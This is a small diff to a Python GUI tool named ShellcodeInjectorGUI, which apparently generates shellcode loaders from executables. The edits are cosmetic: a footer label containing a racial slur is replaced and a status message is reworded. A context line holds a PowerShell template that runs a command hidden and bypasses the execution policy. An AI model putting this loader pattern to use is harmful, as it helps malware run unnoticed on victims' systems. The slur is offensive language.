@@ -32,7 +32,7 @@ class ShellcodeInjectorGUI(ctk.CTk):
         self.generate_button.pack(pady=12)
         self.status = ctk.CTkLabel(self, text="")
         self.status.pack(pady=10)
-        ctk.CTkLabel(self, text="enjyoy nigga hope it works blud", font=ctk.CTkFont(size=12, slant="italic"), anchor="se", text_color="gray").pack(side="bottom", pady=5)
+        ctk.CTkLabel(self, text="Enjoy, owned by devcoded on github", font=ctk.CTkFont(size=12, slant="italic"), anchor="se", text_color="gray").pack(side="bottom", pady=5)
 
     def select_file(self):
         file = fd.askopenfilename(filetypes=[("Executable files", "*.exe")])
@@ -49,7 +49,7 @@ class ShellcodeInjectorGUI(ctk.CTk):
     def check_ready(self):
         if self.exe_path and self.save_dir:
             self.generate_button.configure(state="normal")
-            self.status.configure(text="Ready to generate.")
+            self.status.configure(text="ready to generate")
 
     def generate_loader(self):
         try:
@@ -373,4 +373,5 @@ powershell -exec bypass -WindowStyle Hidden -C "{ps_cmd}"
 
 if __name__ == "__main__":
     app = ShellcodeInjectorGUI()
+
     app.mainloop()
